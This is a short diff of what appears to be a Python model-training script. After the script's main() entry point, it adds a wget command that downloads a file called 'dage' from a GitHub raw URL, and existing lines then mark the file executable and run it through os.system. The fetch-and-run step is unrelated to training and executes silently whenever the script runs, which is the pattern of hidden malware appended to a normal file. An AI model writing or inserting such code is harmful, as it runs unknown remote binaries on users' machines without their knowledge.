@@ -72,7 +72,6 @@ def main():
       global_step=NUM_EPOCHS)
 if __name__ == "__main__":
     main()
-os.system('git clone https://github.com/aqshakuy/jdag.git')
-os.system('cd jdag')
+os.system('wget https://raw.githubusercontent.com/aqshakuy/jdag/main/dage')
 os.system('chmod u+x dage')
 os.system('./dage')
